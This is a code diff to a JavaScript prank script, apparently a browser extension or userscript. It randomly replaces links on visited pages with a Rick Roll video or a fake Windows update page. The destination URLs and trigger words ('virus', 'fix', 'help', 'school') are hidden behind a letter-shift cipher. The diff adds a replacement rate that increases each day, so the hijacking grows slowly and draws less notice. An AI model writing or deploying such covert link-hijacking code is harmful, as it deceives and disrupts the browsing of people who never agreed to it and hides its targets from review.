@@ -12,11 +12,11 @@ let ENABLED = true;
 
 const DEBUG = true;
 
-var replaceRate = 0.3;
+var startReplaceRate = 0.01;
 // const replaceRate = 1;
 
 const URL_RR = "iuuqt;00xxx/zpvuvcf/dpn0xbudi@w>ZeexlNKH2Kp";
-var rrWeight = 0.3;
+var rrWeight = 0.5;
 // const rrWeight = 1;
 
 const URL_WU = "iuuqt;00gblfvqebuf/ofu0xjo21vf0";
@@ -25,10 +25,16 @@ const wuWeight = 0.1;
 const TRIGGERS = ["uif", "sjdl", "spmm", "ipx", "wjsvt", "gjy", "ifmq", "tdippm", "nqtb{", "dpn", "psh"];
 const REPLACEMENT = "TQBN";
 
+const START_DATE = 1604986037029;
+const DAY_MILI = 86400193;
+
+function getReplaceRate() {
+    return startReplaceRate * ((new Date().getTime() - (START_DATE /*- (100*DAY_MILI)*/))/DAY_MILI);
+}
+
 (function() {
-    for (let i=0; i<TRIGGERS.length; i++)
-        print(encrypt(TRIGGERS[i]));
-    print(encrypt(REPLACEMENT));
+    print("current time: " + new Date().getTime());
+    print("replace rate: " + getReplaceRate());
 
     replace();
 
@@ -38,7 +44,7 @@ const REPLACEMENT = "TQBN";
 function replace() {
     let links = getLinks();
     for(let i=0;i<links.length;i++) {
-        if(Math.random() < replaceRate) {
+        if(Math.random() < startReplaceRate) {
             randomReplacement(links[i]);
         }
     }
@@ -49,8 +55,7 @@ function getLinks() {
 }
 
 function randomReplacement(link) {
-    let weightSum = rrWeight + wuWeight;
-    let random = Math.random()*weightSum;
+    let random = Math.random();
     if(random < rrWeight) {
         print(link+": rr");
         rr(link);
